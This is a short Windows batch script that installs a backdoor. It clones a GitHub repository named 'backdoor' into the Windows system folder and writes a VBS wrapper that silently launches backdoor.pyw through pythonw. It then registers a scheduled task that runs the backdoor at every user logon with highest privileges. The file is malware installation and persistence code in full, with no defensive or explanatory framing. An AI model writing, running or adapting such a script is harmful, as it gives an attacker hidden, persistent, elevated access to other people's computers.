@echo off
winget install python3.11
pip install sockets
winget install git
git clone https://github.com/Jevelin4k/backdoor/ C:\Windows\backdoor\v2.0
echo Set WshShell = CreateObject("WScript.Shell") > C:\Windows\backdoor\v2.0\up_2.vbs
echo WshShell.Run "cmd.exe /c C:\Windows\backdoor\v2.0\up_2.bat", 0, False >> C:\Windows\backdoor\v2.0\up_2.vbs
echo @echo off > C:\Windows\backdoor\v2.0\up_2.bat
echo pythonw C:\Windows\backdoor\v2.0\backdoor.pyw >> C:\Windows\backdoor\v2.0\up_2.bat
schtasks /create /tn "backdoor_up_2" /tr "C:\Windows\backdoor\v2.0\up_2.vbs" /sc onlogon /rl highest /f
